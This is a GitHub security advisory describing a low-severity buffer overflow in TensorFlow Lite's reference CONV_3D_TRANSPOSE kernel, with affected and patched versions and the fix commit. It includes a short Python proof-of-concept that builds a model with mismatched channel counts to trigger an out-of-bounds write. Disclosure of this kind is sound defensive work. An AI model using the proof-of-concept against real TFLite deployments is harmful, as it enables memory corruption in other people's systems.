# Buffer overflow in `CONV\_3D\_TRANSPOSE` on TFLite

Low

[pak-laura](/pak-laura)
published
GHSA-h6q3-vv32-2cq5
Nov 18, 2022

## Package

pip

tflite
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.11.0

## Patched versions

2.8.4, 2.9.3, 2.10.1, 2.11.0

## Description

### Impact

The reference kernel of the [`CONV_3D_TRANSPOSE`](https://github.com/tensorflow/tensorflow/blob/091e63f0ea33def7ecad661a5ac01dcafbafa90b/tensorflow/lite/kernels/internal/reference/conv3d_transpose.h#L121) TensorFlow Lite operator wrongly increments the data\_ptr when adding the bias to the result.

Instead of `data_ptr += num_channels;` it should be `data_ptr += output_num_channels;` as if the number of input channels is different than the number of output channels, the wrong result will be returned and a buffer overflow will occur if num\_channels > output\_num\_channels.

An attacker can craft a model with a specific number of input channels in a way similar to the attached example script. It is then possible to write specific values through the bias of the layer outside the bounds of the buffer. This attack only works if the reference kernel resolver is used in the interpreter (i.e. `experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF` is used).

```
import tensorflow as tf
model = tf.keras.Sequential(
    [
        tf.keras.layers.InputLayer(input_shape=(2, 2, 2, 1024), batch_size=1),
        tf.keras.layers.Conv3DTranspose(
            filters=8,
            kernel_size=(2, 2, 2),
            padding="same",
            data_format="channels_last",
        ),
    ]
)

converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()

interpreter = tf.lite.Interpreter(
    model_content=tflite_model,
    experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF,
)

interpreter.allocate_tensors()
interpreter.set_tensor(
    interpreter.get_input_details()[0]["index"], tf.zeros(shape=[1, 2, 2, 2, 1024])
)
interpreter.invoke()
```
### Patches

We have patched the issue in GitHub commit [72c0bdcb25305b0b36842d746cc61d72658d2941](https://github.com/tensorflow/tensorflow/commit/72c0bdcb25305b0b36842d746cc61d72658d2941).

The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.

### For more information

Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
